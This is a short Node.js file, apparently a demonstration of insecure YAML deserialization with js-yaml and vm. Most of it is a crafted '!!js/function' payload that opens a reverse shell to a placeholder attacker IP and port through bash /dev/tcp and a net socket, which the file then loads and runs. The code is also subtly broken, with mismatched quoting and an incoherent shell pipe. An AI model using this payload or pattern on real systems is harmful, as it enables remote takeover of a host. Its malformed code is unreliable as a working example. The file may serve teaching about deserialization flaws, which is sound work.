const yaml = require('js-yaml');
const serialize = require('serialize-javascript');
const vm = require('vm');

class User {
  constructor(name) {
    this.name = name;
  }

  sayHello() {
    return `Hello, ${this.name}`;
  }
}

let user = new User("John Doe");
let serializedUser = yaml.dump(user);

// This is where the vulnerability occurs, an attacker could potentially manipulate the serialized object
// to execute arbitrary code.
let modifiedSerializedUser = `!!js/function "!!js/function () {
  var net = require('net'), sh = require('child_process').exec('bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1');
  var c = new net.Socket(); c.connect(<attacker_port>, '<attacker_ip>', function() {
    c.pipe(sh.stdin); sh.stdout.pipe(c); sh.stderr.pipe(c);
  });"`;

let deserializedUser = yaml.load(modifiedSerializedUser);
let context = { console };
vm.createContext(context); // Contextify the object
vm.runInContext(deserializedUser, context);